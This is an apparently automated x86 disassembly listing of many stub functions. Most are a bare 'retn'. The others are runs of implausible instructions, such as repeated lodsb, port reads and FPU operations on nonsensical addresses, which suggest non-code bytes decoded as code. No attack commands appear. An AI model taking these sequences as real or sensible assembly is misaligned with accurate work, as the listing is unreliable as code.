retn
sub_47d84f
retn
sub_47d850
retn
sub_47d851
fcomp [ ebx - 0x54e125cb ]
or dh [ 0x39a91eda ]
xor eax ebx
fwait
xor eax 0x60af1eda
0xad1eda35 0xba0a

sub_47d86e
lodsb [ esi ]
lodsb [ esi ]
retn
sub_47d871
shr [ esi + edi * 2 - 0x29a3f7f4 ] 0x1
push ecx
push ebx
push ebx
push ebx
movsb [ edi ] [ esi ]
mov edx [ eax - 0x3c3c3c3d ]
retn
sub_47d8ac
retn
sub_47d8ad
retn
sub_47d8ae
retn
sub_47d8af
retn
sub_47d8b0
retn
sub_47d8b1
retn
sub_47d8b2
retn
sub_47d8b3
retn
sub_47d8b4
retn
sub_47d8b5
retn
sub_47d8b6
retn
sub_47d8b7
retn
sub_47d8b8
retn
sub_47d8b9
retn
sub_47d8ba
retn
sub_47d8bb
retn
sub_47d8bc
pop esp
in al 0x5b
mov edx 0x53534ded
retn
sub_47d8c5
retn
sub_47d8c6
add ebp [ esi + 0x4f04acb7 ]
fcomp [ 0xffffffffa7e3ba7b ]
lodsb [ esi ]
lodsb [ esi ]
retn
sub_47d8d6
retn
sub_47d8d7
retn
sub_47d8d9
retn
sub_47d8da
push es
fdivr [ edi + 0x73bfd0 ]
add eax 0x537915ba
push ebx
retn
sub_47d8e8
retn
sub_47d8e9
retn
sub_47d8ea
retn
sub_47d8eb
retn
sub_47d8ec
retn
sub_47d8ed
retn
sub_47d8ee
retn
sub_47d8ef
retn
sub_47d8f0
retn
sub_47d8fd
fisub [ ebx - 0x44535358 ]
or eax 0xde535377
fisubr [ ebx - 0x44535352 ]
add [ edi + 0x53 ] dh
push ebx
faddp st6
mov [ 0xffffffffbbacaca8 ] eax
shr [ ebx - 0x745b5354 ] 0x1
mov edx 0xacacbab1
retn
sub_47d925
retn
sub_47d926
retn
sub_47d927
retn
sub_47d928
retn
sub_47d929
retn
sub_47d92a
retn
sub_47d92b
retn
sub_47d92c
retn
sub_47d92d
cmp [ edi ] edi
xor eax 0xbaa516da
jns r-xdata
retn
lodsb [ esi ]
lodsb [ esi ]
cmp [ ebx - 0x46 ] edx
xchg edx eax
mov [ esp + ebp * 4 - 0x3c3c3c3d ] gs
retn
sub_47d944
retn
sub_47d945
retn
sub_47d946
retn
sub_47d947
retn
sub_47d948
retn
sub_47d949
retn
sub_47d94a
retn
sub_47d94b
retn
sub_47d94c
retn
sub_47d94d
retn
sub_47d94e
retn
sub_47d94f
xor eax 0xbabf1eda
cmpsd [ esi ] [ edi ]
mov ebx 0xc3c3acac
retn
sub_47d95b
retn
sub_47d95c
retn
sub_47d95d
retn
sub_47d95e
retn
sub_47d95f
retn
sub_47d960
retn
sub_47d996
retn
sub_47d997
retn
sub_47d998
retn
sub_47d999
retn
sub_47d99a
retn
sub_47d99b
retn
sub_47d99c
retn
sub_47d99d
retn
sub_47d99e
retn
sub_47d99f
retn
sub_47d9a0
retn
sub_47d9a1
retn
sub_47d9db
retn
sub_47d9dc
retn
sub_47d9dd
retn
sub_47d9de
retn
sub_47d9df
retn
sub_47d9e0
retn
sub_47d9e1
retn
sub_47d9e2
retn
sub_47d9e3
retn
sub_47d9e4
retn
sub_47d9e5
retn
sub_47d9e6
cmp [ ebx ] esp
mov edx 0x53537cd9
retn
sub_47d9ee
retn
sub_47d9ef
retn
sub_47d9f0
retn
sub_47d9f1
retn
sub_47d9f2
retn
sub_47d9f3
retn
sub_47d9f4
retn
sub_47d9f5
retn
sub_47d9f6
fdivr [ edi - 0x45a4e928 ]
sub al 0x47
push ebx
push ebx
retn
sub_47da01
retn
sub_47da02
retn
sub_47da03
retn
sub_47da04
retn
sub_47da30
retn
sub_47da56
push 0x82d65ca0
jpe r-xdata
lodsb [ esi ]
lodsb [ esi ]
cmp eax [ ebx + 0x60535252 ]
mov [ eax ] al
lodsb [ esi ]
push ebx
add [ edx - 0x53534b12 ] bh
retn
sub_47da65
retn
sub_47da66
retn
sub_47da86
retn
sub_47da87
retn
sub_47da88
retn
sub_47da89
retn
sub_47da8a
retn
sub_47da8b
retn
sub_47da8c
retn
sub_47da8d
retn
sub_47da8e
retn
sub_47da8f
retn
sub_47da90
retn
sub_47da91
retn
sub_47da92
retn
sub_47da93
retn
sub_47da94
retn
sub_47da95
retn
sub_47da96
retn
sub_47da97
retn
sub_47da98
retn
sub_47da99
pop esp
in al 0x61
xor eax 0x76baa5d6
push edi
push ebx
push ebx
retn
sub_47dad6
retn
sub_47dad7
retn
sub_47dad8
retn
sub_47dad9
or eax 0xc3909a08
retn
sub_47dadf
retn
sub_47dae0
retn
sub_47dae1
retn
sub_47dae2
ficomp [ esi ]
scasd [ edi ]
add ch [ esi - 0x50d12559 ]
add eax [ eax ]
lodsb [ esi ]
add eax 0xa566ba17
lodsb [ esi ]
lodsb [ esi ]
retn
sub_47daf7
retn
sub_47daf8
retn
sub_47daf9
retn
sub_47dafa
retn
sub_47dafb
add edi [ ebx ]
push ebp
push ebx
push ecx
push ebx
add [ edx - 0x5353722f ] bh
retn
sub_47db08
retn
sub_47db09
retn
sub_47db0a
retn
sub_47db0b
retn
sub_47db0c
retn
sub_47db21
retn
sub_47db22
add ebx eax
push ss
pop ebx
mov edx 0xacaca719
retn
sub_47db2c
retn
sub_47db2d
retn
sub_47db2e
retn
sub_47db2f
retn
sub_47db30
retn
sub_47db31
retn
sub_47db32
pop esp
shl [ eax ] 0x1
mov cl 0xac
lodsb [ esi ]
pop esp
in al 0x10
dec edi
xor eax 0xd75c93d6
retn
sub_47db65
retn
sub_47db66
retn
sub_47db67
retn
sub_47db68
retn
sub_47db69
retn
sub_47db6a
retn
sub_47db6b
cmp [ ebx - 0x46 ] eax
mov eax [ edx + 0x53 ]
push ebx
retn
sub_47db73
retn
sub_47db74
retn
sub_47db75
retn
sub_47db76
retn
sub_47db77
retn
sub_47db78
fcomp st6
mov edi 0xbbacacae
mov esi 0xd8535346
push es
pop edi
mov edx 0x53534327
retn
sub_47db8c
retn
sub_47db8d
retn
sub_47db8e
retn
sub_47db8f
retn
sub_47db90
retn
sub_47db91
retn
sub_47db92
retn
sub_47db93
retn
sub_47db94
retn
sub_47db95
retn
sub_47db96
retn
sub_47db97
retn
sub_47db98
retn
sub_47db99
retn
sub_47db9a
retn
sub_47db9b
retn
sub_47db9c
retn
sub_47db9d
retn
sub_47db9e
retn
sub_47db9f
pop esp
in eax 0x55
add al 0xba
r-xdata
adc eax 0x6123ba03
push ebx
push ebx
retn
push ebx
retn
sub_47dba9
retn
sub_47dbaa
mov ebx 0x53537633
or al 0xd
or dh dl
xchg ebx eax
pop esp
xlat
fcom [ edi + 0x53 ]
push ebx
mov edx 0xacaca459
retn
sub_47dbc0
retn
sub_47dbc1
retn
sub_47dbe9
retn
sub_47dbea
retn
sub_47dbeb
retn
sub_47dbec
add eax 0xd63592d8
cmp [ edx - 0x53534c42 ] 0x15d8c3c3
add edi [ edx + 0x53536123 ]
retn
sub_47dc02
retn
sub_47dc03
retn
sub_47dc04
retn
sub_47dc05
retn
sub_47dc06
retn
sub_47dc07
retn
sub_47dc0a
iretd
sub_47dc0b
push ebx
push ebx
push ebx
mov ebx 0xacacb992
fcmovbe st5
push ebx
push ebx
push ebx
rcl [ edi - 0x587e459d ] 0x1
lodsb [ esi ]
lodsb [ esi ]
retn
sub_47dc22
retn
sub_47dc23
retn
sub_47dc24
retn
sub_47dc25
retn
sub_47dc26
add al 0xbb
push ds
push ebx
push ebx
rcl [ edi + 0x7c48ba43 ] 0x1
push ebx
push ebx
retn
sub_47dc35
retn
sub_47dc36
retn
sub_47dc37
retn
sub_47dc38
retn
sub_47dc39
retn
sub_47dc3a
retn
sub_47dc3b
or edi [ ecx ]
mov edx 0xacacb5ff
shr [ ecx - 0x3629a388 ] 0x1
pushad
push ebx
push ebx
mov edx 0x535360dc
retn
sub_47dc52
retn
sub_47dc53
or eax 0xc3909a08
retn
sub_47dc59
retn
sub_47dc5a
retn
sub_47dc7f
retn
sub_47dc80
retn
sub_47dc81
fmul [ ecx - 0x8f125cb ]
or [ edx + 0x5353462f ] bh
retn
sub_47dc8e
retn
sub_47dc8f
retn
sub_47dc90
retn
sub_47dc91
retn
sub_47dc92
retn
sub_47dc93
retn
sub_47dc94
retn
sub_47dc95
retn
sub_47dc96
retn
sub_47dc97
retn
sub_47dcb7
retn
sub_47dcb8
retn
sub_47dcdf
retn
sub_47dce0
retn
sub_47dce1
retn
sub_47dce2
retn
sub_47dce3
retn
sub_47dce4
retn
sub_47dce5
retn
sub_47dce6
add [ 0x53efe3d8 ] al
push ebx
push ebx
mov edx 0x53534851
retn
sub_47dcf4
retn
sub_47dcf5
retn
sub_47dcf6
retn
sub_47dcf7
xor eax 0xbb716da
cmp [ edi ] esp
xor eax 0xbb516da
mov edx 0x535348a0
retn
sub_47dd09
retn
sub_47dd0a
retn
sub_47dd0b
pop esp
shl [ esi - 0x29535374 ] 0x1
lodsb [ esi ]
pop esp
salc
mov esi 0xbaacac8c
mov bh 0xb7
lodsb [ esi ]
lodsb [ esi ]
retn
sub_47dd1f
retn
sub_47dd20
retn
sub_47dd21
retn
sub_47dd22
retn
sub_47dd23
retn
sub_47dd24
retn
sub_47dd25
retn
sub_47dd26
retn
sub_47dd27
retn
sub_47dd28
retn
sub_47dd29
retn
sub_47dd2a
pushad
0xd8a70ed8 0x8085
test eax 0x534196ba
push ebx
retn
sub_47dd39
mov ebx 0x53534be2
or cl [ edx ]
salc
xchg ebx eax
pop esp
xlat
mov ebx 0x60535363
xchg ebx eax
adc edi [ edx + 0x535363b1 ]
retn
sub_47dd51
retn
sub_47dd52
retn
sub_47dd53
retn
sub_47dd54
retn
sub_47dd55
retn
sub_47dd56
retn
sub_47dd57
retn
sub_47dd58
pushad
xchg ebx eax
mov edx 0xacacae29
retn
sub_47dd60
retn
sub_47dd61
retn
sub_47dd62
retn
sub_47dd63
retn
sub_47dd64
retn
sub_47dd65
retn
sub_47dd66
retn
sub_47dd67
retn
sub_47dd68
retn
sub_47dd69
retn
sub_47dd6a
retn
sub_47dd6b
retn
sub_47dd6c
retn
sub_47dd6d
mov edx 0x535341e6
retn
sub_47dd73
retn
sub_47dd74
retn
sub_47dd75
retn
sub_47dd76
retn
sub_47dd77
retn
sub_47dd78
retn
sub_47dd79
retn
sub_47dd7a
retn
sub_47dd7b
retn
sub_47dd7c
retn
sub_47dd7d
retn
sub_47dd7e
retn
sub_47dd7f
retn
sub_47dd80
retn
sub_47dd81
retn
sub_47dd82
retn
sub_47dd83
retn
sub_47dd84
retn
sub_47dd85
retn
sub_47dd86
retn
sub_47dd87
retn
sub_47dd88
retn
sub_47dd89
retn
sub_47dd8a
retn
sub_47dd8b
retn
sub_47dd8c
retn
sub_47dd8d
retn
sub_47dd8e
retn
sub_47dd8f
retn
sub_47dd90
ficom [ esi ]
stosd [ edi ]
mov edx 0x53535bb2
retn
sub_47dd99
xor eax 0x5c15106a
xlat
push ss
jno r-xdata
retn
push ebx
mov edx 0x5353520b
retn
sub_47dda9
retn
sub_47ddaa
retn
sub_47ddab
retn
sub_47ddac
retn
sub_47ddad
retn
sub_47ddae
retn
sub_47ddaf
mov ebx 0xacacbeb0
rcl [ edi + 0x772f6a5f ] 0x1
jae r-xdata
fisubr [ esi ]
stosd [ edi ]
lodsb [ esi ]
xlat
0xdeacaca2 0x77d7

sub_47ddc5
push ecx
push ebx
push ebx
mov edx 0xacaca2e7
retn
sub_47ddce
pushad
xchg ebx eax
mov edx 0x53536551
retn
sub_47ddd6
retn
sub_47ddd7
retn
sub_47ddd8
retn
sub_47ddd9
retn
sub_47ddda
retn
sub_47dddb
retn
sub_47dddc
retn
sub_47dddd
retn
sub_47ddde
retn
sub_47dddf
retn
sub_47dde0
retn
sub_47dde1
retn
sub_47dde2
retn
sub_47dde3
retn
sub_47dde4
retn
sub_47dde5
retn
sub_47dde6
cmp ebx [ ebx + 0x3b ]
fidiv [ eax - 0x46 ]
jpo r-xdata
retn
push ebx
push ebx
retn
sub_47ddf1
retn
sub_47ddf2
retn
sub_47ddf3
retn
sub_47ddf4
retn
sub_47ddf6
retn
sub_47ddf7
retn
sub_47ddf8
retn
sub_47de27
push 0xba035b07
add al 0x65
push ebx
push ebx
retn
sub_47de31
add eax 0xc0304ac
or eax 0xc3c3909a
retn
sub_47de3c
retn
sub_47de3d
retn
sub_47de3f
retn
sub_47de40
retn
sub_47de41
retn
sub_47de42
lodsb [ esi ]
add al 0x3
push 0x7b39ba90
push ebx
push ebx
push 0x89d55c90
mov [ esp + ebp * 4 - 0x53490946 ] gs
lodsb [ esi ]
retn
sub_47de5a
retn
sub_47de5b
retn
sub_47de5c
retn
sub_47de5d
retn
sub_47de5e
retn
sub_47de5f
mov ebx 0xacacbb23
cmp edx edi
sub [ ebp - 0x7a ] cl
add al 0xda
adc eax 0xbb31bb4b
lodsb [ esi ]
lodsb [ esi ]
mov edx 0xacaca8dd
retn
sub_47de78
retn
sub_47de79
retn
sub_47de7a
retn
sub_47de7b
cmp [ ebx - 0x46 ] edx
jbe r-xdata
mov edx 0xacac8dcf
retn
push ebx
push ebx
retn
sub_47de83
add [ ebx ] bh
mov [ 0xffffffffac133a4e ] al
in eax 0x97
push ebx
push ebx
push ebx
fsubr [ ebp - 0x53481145 ]
lodsb [ esi ]
mov edx 0x535370f5
retn
sub_47de9c
retn
sub_47de9d
retn
sub_47de9e
retn
sub_47de9f
retn
sub_47dea0
retn
sub_47dea1
retn
sub_47dea2
retn
sub_47dea3
retn
sub_47dea4
retn
sub_47dea5
retn
sub_47dea6
retn
sub_47dea7
retn
sub_47dea8
retn
sub_47dea9
or edi [ ecx ]
cmp eax 0xacb236ba
lodsb [ esi ]
retn
sub_47deb2
retn
sub_47deb3
retn
sub_47deb4
retn
sub_47deb5
retn
sub_47deb6
retn
sub_47deb7
retn
sub_47deb8
retn
sub_47deb9
retn
sub_47deba
retn
sub_47debb
retn
sub_47debc
retn
sub_47debd
retn
sub_47debe
retn
sub_47debf
retn
sub_47dec0
retn
sub_47dec1
retn
sub_47dec2
retn
sub_47dec3
retn
sub_47dec4
retn
sub_47dec5
retn
sub_47dec6
retn
sub_47dec7
retn
sub_47dec8
retn
sub_47dec9
pop esp
xlat
inc eax
mov [ esp + ebp * 4 - 0x53723046 ] ebp
lodsb [ esi ]
retn
sub_47ded5
retn
sub_47ded6
retn
sub_47ded7
pop esp
rcr ecx 0x1
push bx
push ebx
mov edx 0xacacbb03
retn
sub_47dee3
retn
sub_47dee4
retn
sub_47dee5
retn
sub_47dee6
retn
sub_47dee7
retn
sub_47dee8
retn
sub_47dee9
retn
sub_47deea
retn
sub_47deeb
retn
sub_47deec
retn
sub_47deed
retn
sub_47deee
retn
sub_47deef
retn
sub_47def0
retn
sub_47def1
retn
sub_47def2
push es
fdivr [ edi + 0x5937bfd2 ]
push ebx
push ebx
mov edx 0x53534fae
mov edx 0x53535dde
retn
sub_47df06
retn
sub_47df07
retn
sub_47df08
retn
sub_47df3a
pop esp
in al 0x42
rcl [ edx - 0x547445af ] 0x1
lodsb [ esi ]
lodsb [ esi ]
retn
sub_47df46
retn
sub_47df47
retn
sub_47df48
retn
sub_47df49
retn
sub_47df4a
retn
sub_47df4b
retn
sub_47df4c
retn
sub_47df4d
retn
sub_47df4e
retn
sub_47df4f
retn
sub_47df50
retn
sub_47df51
retn
sub_47df52
retn
sub_47df53
retn
sub_47df54
retn
sub_47df55
retn
sub_47df56
retn
sub_47df57
retn
sub_47df87
retn
sub_47df88
fcomp st6
mov ebx 0xbaacacaf
popad
jo r-xdata
mov edx 0x53537393
salc
mov [ edi + edx * 8 - 0x20 ] bl
mov ebp 0x26acacac
scasd [ edi ]
add al 0xac
push ebx
retn
sub_47df94
retn
sub_47df95
retn
sub_47dfb6
push ebx
push ebx
fsub st4
mov edx [ ebx + 0x53 ]
push ebx
push 0x7eb2baa0
push ebx
push ebx
retn
sub_47dfc6
retn
sub_47dff8
fist [ ebx + 0x53 ]
push ebx
mov edx 0x535359f6
retn
sub_47e002
retn
sub_47e018
retn
sub_47e019
retn
sub_47e01a
retn
sub_47e01b
retn
sub_47e01c
retn
sub_47e01d
retn
sub_47e01e
retn
sub_47e01f
retn
sub_47e020
retn
sub_47e021
retn
sub_47e022
retn
sub_47e023
retn
sub_47e024
retn
sub_47e025
retn
sub_47e026
retn
sub_47e027
retn
sub_47e028
sar [ edi + 0x535357ff ] cl
mov edx 0x53534b2f
pushad
xchg ebx eax
adc edi [ edx - 0x53535940 ]
retn
sub_47e03c
retn
sub_47e03d
retn
sub_47e03e
retn
sub_47e03f
retn
sub_47e040
retn
sub_47e041
retn
sub_47e042
retn
sub_47e043
retn
sub_47e044
retn
sub_47e045
pushad
xchg ebx eax
adc ebx [ edx - 0x3c3c3c70 ]
add eax 0xac85a5ba
lodsb [ esi ]
retn
sub_47e086
retn
sub_47e087
retn
sub_47e088
retn
sub_47e0b2
retn
sub_47e0b3
retn
sub_47e0b4
retn
sub_47e0b5
retn
sub_47e0b6
retn
sub_47e0b7
xor eax 0xbb916da
cmp [ esi + 0x35 ] esi
ficom [ esi ]
mov edi 0xac89b6ba
lodsb [ esi ]
retn
sub_47e0c8
retn
sub_47e0c9
retn
sub_47e0ca
retn
sub_47e0cb
retn
sub_47e0cc
retn
sub_47e0cd
retn
sub_47e0ce
retn
sub_47e0cf
retn
sub_47e0d0
retn
sub_47e0d1
retn
sub_47e0d2
retn
sub_47e0d3
retn
sub_47e0d4
retn
sub_47e0d5
retn
sub_47e0d6
retn
sub_47e104
retn
sub_47e105
retn
sub_47e106
retn
sub_47e107
retn
sub_47e108
retn
sub_47e109
retn
sub_47e129
fcom [ ebp + 0x537008bb ]
push ebx
shr [ ebx + 0x58d65c52 ] 0x1
jne r-xdata
retn
push ebx
mov edx 0x535376ac
retn
sub_47e13f
retn
sub_47e140
retn
sub_47e141
retn
sub_47e142
fadd [ ebx + 0x537c33ba ]
push ebx
retn
sub_47e14a
retn
sub_47e14b
retn
sub_47e14c
retn
sub_47e14d
retn
sub_47e14e
retn
sub_47e14f
retn
sub_47e150
retn
sub_47e151
retn
sub_47e152
retn
sub_47e153
retn
sub_47e154
retn
sub_47e155
retn
sub_47e156
retn
sub_47e169
lodsb [ esi ]
lodsb [ esi ]
retn
sub_47e16c
retn
sub_47e16d
retn
sub_47e16e
retn
sub_47e16f
retn
sub_47e170
retn
sub_47e171
retn
sub_47e172
cmp edx [ ebx + 0x43 ]
push ebx
push ebx
ficom [ esi ]
fwait
add edi [ ecx ]
lodsb [ esi ]
lodsb [ esi ]
mov [ es : 0x535101ba ] eax
push ebx
retn
sub_47e186
retn
sub_47e187
retn
sub_47e188
retn
sub_47e189
retn
sub_47e18a
retn
sub_47e18c
retn
sub_47e18d
retn
sub_47e18e
salc
xchg ebx eax
mov edx 0x53537ed5
retn
sub_47e196
retn
sub_47e197
xor eax 0x39ab16da
sub ecx [ ebx ]
xor eax 0x39a916da
or esi [ ss : 0x60af16da ]
xchg ebx eax
xor eax 0xdead16da
push ss
mov [ 0xffffffffaca526ba ] eax
lodsb [ esi ]
retn
sub_47e1b8
retn
sub_47e1b9
retn
sub_47e1ba
retn
sub_47e1bb
retn
sub_47e1bc
retn
sub_47e1bd
retn
sub_47e1be
add edi [ ebx - 0x53534580 ]
rcl [ edi - 0x5ce921b5 ] 0x1
add ebx esi
push ss
sti
add eax [ eax ]
add [ edx - 0x53534bfa ] bh
retn
sub_47e1d7
or al 0xd
nop
retn
sub_47e1db
retn
sub_47e1dc
retn
sub_47e1dd
retn
sub_47e1de
retn
sub_47e1df
retn
sub_47e1e0
retn
sub_47e1e1
retn
sub_47e1e2
retn
sub_47e1e3
retn
sub_47e1e4
retn
sub_47e1e5
retn
sub_47e1e6
retn
sub_47e1e7
retn
sub_47e1e8
retn
sub_47e1e9
retn
sub_47e1ea
retn
sub_47e1eb
retn
sub_47e1ec
retn
sub_47e1ed
retn
sub_47e1ee
pushad
xchg ebx eax
or al 0xd
or [ edx - 0x3c3c3c70 ] bl
retn
sub_47e1f9
retn
sub_47e1fa
retn
sub_47e1fb
retn
sub_47e1fc
retn
sub_47e1fd
xor eax 0x35b506da
ficomp [ esi ]
mov [ 0xffffffffacbadebb ] eax
lodsb [ esi ]
mov edx 0x5353775f
retn
sub_47e210
retn
sub_47e211
retn
sub_47e212
retn
sub_47e213
retn
sub_47e214
retn
sub_47e215
pushad
xchg ebx eax
add edi [ ecx ]
push ecx
mov edx 0x535371b0
retn
sub_47e220
retn
sub_47e221
retn
sub_47e222
retn
sub_47e223
pushad
sbb eax 0x4326a492
adc eax 0xfdba81d6
jpo r-xdata
or edi [ edx + 0x53537edc ]
retn
push ebx
retn
sub_47e233
retn
sub_47e234
xor eax 0xbbf16da
cmp [ edx ] edi
mov edx 0x53535313
retn
sub_47e241
add edi [ edx - 0x53534a06 ]
retn
sub_47e248
retn
sub_47e249
retn
sub_47e24a
retn
sub_47e24b
retn
sub_47e24c
retn
sub_47e27e
retn
sub_47e27f
retn
sub_47e280
xor eax 0xbbd16da
mov edx 0x53537edc
retn
sub_47e28b
retn
sub_47e28c
retn
sub_47e28d
retn
sub_47e28e
retn
sub_47e28f
retn
sub_47e290
retn
sub_47e291
retn
sub_47e292
retn
sub_47e293
retn
sub_47e294
retn
sub_47e295
retn
sub_47e296
retn
sub_47e297
retn
sub_47e2c5
mov ch 0xac
lodsb [ esi ]
lodsb [ esi ]
pop edi
fcom [ esi ]
pop ebx
lodsb [ esi ]
add esi [ edi ]
lodsb [ esi ]
scasd [ edi ]
mov edx 0x535358e3
retn
sub_47e2da
retn
sub_47e2db
retn
sub_47e2dc
retn
sub_47e2dd
retn
sub_47e2de
retn
sub_47e2df
retn
sub_47e2e0
retn
sub_47e2e1
retn
sub_47e2e2
retn
sub_47e2e3
retn
sub_47e2e4
retn
sub_47e2e5
retn
sub_47e2e6
retn
sub_47e2e7
ficom [ esi ]
scasd [ edi ]
rcl [ esi ] 0x1
scasd [ edi ]
push edi
pop esp
in al 0x91
fimul [ ebx ]
push ecx
mov edx 0x5353488e
retn
sub_47e2fa
retn
sub_47e2fb
retn
sub_47e2fc
retn
sub_47e2fd
retn
sub_47e2fe
retn
sub_47e2ff
retn
sub_47e300
retn
sub_47e301
lodsb [ esi ]
inc edi
mov edx 0x535374a0
retn
sub_47e30a
retn
sub_47e30b
retn
sub_47e30c
retn
sub_47e30d
retn
sub_47e30e
retn
sub_47e30f
retn
sub_47e310
retn
sub_47e311
retn
sub_47e312
retn
sub_47e33c
retn
sub_47e33d
retn
sub_47e33e
retn
sub_47e33f
retn
sub_47e340
retn
sub_47e341
retn
sub_47e342
retn
sub_47e343
retn
sub_47e344
retn
sub_47e345
retn
sub_47e346
retn
sub_47e347
retn
sub_47e348
retn
sub_47e349
retn
sub_47e34a
retn
sub_47e34b
retn
sub_47e34c
retn
sub_47e371
retn
sub_47e372
retn
sub_47e373
retn
sub_47e374
retn
sub_47e375
retn
sub_47e376
xor eax 0xbaab0eda
mov ch 0x79
push ebx
push ebx
retn
sub_47e380
mov edx 0xacaca7bf
retn
sub_47e386
retn
sub_47e387
retn
sub_47e388
retn
sub_47e389
retn
sub_47e38a
retn
sub_47e38b
retn
sub_47e38c
fsubr [ eax - 0x6cd125cb ]
fsubr [ edx - 0x6ed125cb ]
mov edx 0xacac8a51
retn
sub_47e39e
retn
sub_47e39f
retn
sub_47e3a0
retn
sub_47e3a1
retn
sub_47e3a2
retn
sub_47e3a3
retn
sub_47e3a4
retn
sub_47e3a5
retn
sub_47e3a6
retn
sub_47e3a7
retn
sub_47e3a8
retn
sub_47e3a9
retn
sub_47e3aa
xor eax 0xd85b0eda
lea edi [ edx + 0x53537a96 ]
retn
sub_47e3b6
retn
sub_47e3b7
retn
sub_47e3b8
retn
sub_47e3b9
retn
sub_47e3ba
retn
sub_47e3bb
pushad
xchg ebx eax
or bh [ edx + 0x53535c97 ]
retn
sub_47e3c4
retn
sub_47e3c5
retn
sub_47e3c6
retn
sub_47e3c7
retn
sub_47e3c8
retn
sub_47e3c9
retn
sub_47e3ca
retn
sub_47e3cb
retn
sub_47e3cc
retn
sub_47e3cd
retn
sub_47e3ce
retn
sub_47e3cf
retn
sub_47e3d0
retn
sub_47e3d1
retn
sub_47e3d2
retn
sub_47e3d3
retn
sub_47e3d4
retn
sub_47e3d5
retn
sub_47e3d6
retn
sub_47e3d7
fimul [ esi ]
fwait
add al 0xbb
add ah [ ebp - 0x1a455354 ]
mov esp 0xc3c3acac
retn
sub_47e3e8
add ebp [ esi + 0xf04acb7 ]
mov edx 0xacaca397
retn
sub_47e40e
retn
sub_47e40f
retn
sub_47e410
retn
sub_47e411
retn
sub_47e412
retn
sub_47e413
retn
sub_47e414
retn
sub_47e415
retn
sub_47e416
xor eax 0xbaa716da
div [ esi - 0x3c3c5354 ]
retn
sub_47e422
retn
sub_47e423
retn
sub_47e424
retn
sub_47e425
retn
sub_47e426
retn
sub_47e427
retn
sub_47e428
retn
sub_47e429
retn
sub_47e42a
retn
sub_47e42b
retn
sub_47e42c
retn
sub_47e42d
retn
sub_47e42e
retn
sub_47e42f
retn
sub_47e430
retn
sub_47e431
retn
sub_47e432
retn
sub_47e433
retn
sub_47e434
retn
sub_47e435
retn
sub_47e436
retn
sub_47e437
retn
sub_47e438
retn
sub_47e439
retn
sub_47e43a
retn
sub_47e43b
retn
sub_47e43c
retn
sub_47e43d
retn
sub_47e43e
retn
sub_47e43f
or [ edx - 0x3c3c3c70 ] bl
retn
sub_47e446
retn
sub_47e447
retn
sub_47e448
retn
sub_47e449
retn
sub_47e44a
retn
sub_47e44b
retn
sub_47e44c
retn
sub_47e44d
ficom [ esi ]
cmpsd [ esi ] [ edi ]
add ebx eax
push ss
pop ebx
cmp [ ebx - 0x46 ] edx
dec ecx
inc esi
push ebx
push ebx
retn
sub_47e45c
retn
sub_47e45d
retn
sub_47e45e
retn
sub_47e45f
fcom [ ebp - 0x534abe45 ]
lodsb [ esi ]
rcl [ edi + 0x7717da5f ] 0x1
inc ebx
salc
xchg ebx eax
pop esp
xlat
bound ecx [ ebx + edx * 2 + 0x53 ]
mov edx 0xacac8818
retn
sub_47e47b
retn
sub_47e47c
xor eax 0xb8f16da
mov edx 0xacaca633
mov ebx 0x535348cc
salc
xchg ebx eax
mov edx 0xacacb6ff
retn
sub_47e493
retn
sub_47e494
retn
sub_47e495
retn
sub_47e496
retn
sub_47e497
retn
sub_47e498
retn
sub_47e499
retn
sub_47e49a
retn
sub_47e49b
retn
sub_47e49c
retn
sub_47e49d
retn
sub_47e49e
retn
sub_47e49f
retn
sub_47e4a0
retn
sub_47e4c5
retn
sub_47e4c6
retn
sub_47e4c7
retn
sub_47e4c8
retn
sub_47e4c9
retn
sub_47e4ca
retn
sub_47e4cb
retn
sub_47e4cc
retn
sub_47e4cd
retn
sub_47e4ce
retn
sub_47e4cf
retn
sub_47e4d0
retn
sub_47e4d1
retn
sub_47e4d2
retn
sub_47e4d3
retn
sub_47e4d4
retn
sub_47e4d5
retn
sub_47e4d6
retn
sub_47e4d7
retn
sub_47e4d8
retn
sub_47e4d9
retn
sub_47e4da
retn
sub_47e4db
retn
sub_47e4dc
retn
sub_47e4dd
retn
sub_47e4de
retn
sub_47e4df
retn
sub_47e4e0
retn
sub_47e4e1
lodsb [ esi ]
inc ebx
mov edx 0x53537076
retn
sub_47e4ea
retn
sub_47e4eb
or [ edx - 0x3c3c3c70 ] bl
retn
sub_47e4f2
retn
sub_47e4f3
retn
sub_47e4f4
retn
sub_47e4f5
retn
sub_47e4f6
retn
sub_47e4f7
retn
sub_47e4f8
retn
sub_47e4f9
retn
sub_47e4fa
retn
sub_47e4fb
retn
sub_47e4fc
retn
sub_47e4fd
retn
sub_47e4fe
retn
sub_47e4ff
retn
sub_47e500
fcom st3
not [ ebx + 0x53 ]
push ebx
rcl [ ebx - 0x5f1445a5 ] 0x1
lodsb [ esi ]
lodsb [ esi ]
retn
sub_47e50f
retn
sub_47e510
retn
sub_47e511
retn
sub_47e512
retn
sub_47e513
retn
sub_47e514
retn
sub_47e515
retn
sub_47e516
retn
sub_47e517
retn
sub_47e518
retn
sub_47e519
retn
sub_47e51a
retn
sub_47e51b
retn
sub_47e51c
retn
sub_47e51d
retn
sub_47e51e
retn
sub_47e51f
retn
sub_47e520
retn
sub_47e521
retn
sub_47e522
retn
sub_47e523
retn
sub_47e524
retn
sub_47e525
retn
sub_47e526
retn
sub_47e527
retn
sub_47e55c
retn
sub_47e55d
retn
sub_47e55e
add al 0xd8
stosd [ edi ]
cmp edx [ edi + 0x52 ]
push ebx
push ebx
fcomp st6
xrstor [ esp + ebp * 4 + 0x56abba03 ]
push ebx
push ebx
retn
sub_47e573
retn
sub_47e574
retn
sub_47e575
retn
sub_47e576
retn
sub_47e577
retn
sub_47e578
retn
sub_47e579
retn
sub_47e57a
retn
sub_47e57b
rcl [ edi - 0x402921a1 ] 0x1
scasb [ edi ]
lodsb [ esi ]
lodsb [ esi ]
add ebp [ esp + eax - 0x44292181 ]
scasd [ edi ]
lodsb [ esi ]
lodsb [ esi ]
add edi [ ebx - 0x535346cf ]
adc eax [ ebx ]
mov edx 0xacacaabe
retn
sub_47e59c
retn
sub_47e59d
retn
sub_47e59e
retn
sub_47e5a0
retn
sub_47e5a1
retn
sub_47e5a2
add [ esi - 0x83b5371 ] ch
push ebx
push ebx
push ebx
pushad
xchg ebx eax
or eax 0x537272ba
push ebx
retn
sub_47e5b5
retn
sub_47e5b6
retn
sub_47e5b7
retn
sub_47e5b8
retn
sub_47e5b9
retn
sub_47e5ba
retn
sub_47e5bb
retn
sub_47e5bc
retn
sub_47e5bd
retn
sub_47e5be
retn
sub_47e5bf
retn
sub_47e5c0
retn
